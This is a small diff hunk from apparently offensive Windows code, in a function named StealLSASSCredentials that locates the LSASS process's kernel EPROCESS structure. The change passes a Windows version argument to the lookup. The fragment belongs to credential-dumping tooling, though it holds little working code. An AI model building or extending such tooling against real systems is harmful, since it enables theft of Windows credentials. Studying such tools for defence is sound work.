@@ -153,7 +153,7 @@ BOOL StealLSASSCredentials(HANDLE hFile, char* pvWindowsVersion, BOOL RetrieveMS
     
     // Get LSASS EPROCESS address
     DWORD64 ntEprocessVA = GetNtEprocessAddress(hFile);
-    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA);
+    DWORD64 LsassEprocessVA = GetTargetEProcessAddress(hFile, LsassPID, ntEprocessVA, pvWindowsVersion);
     if (LsassEprocessVA == 0)
        return FALSE;
 
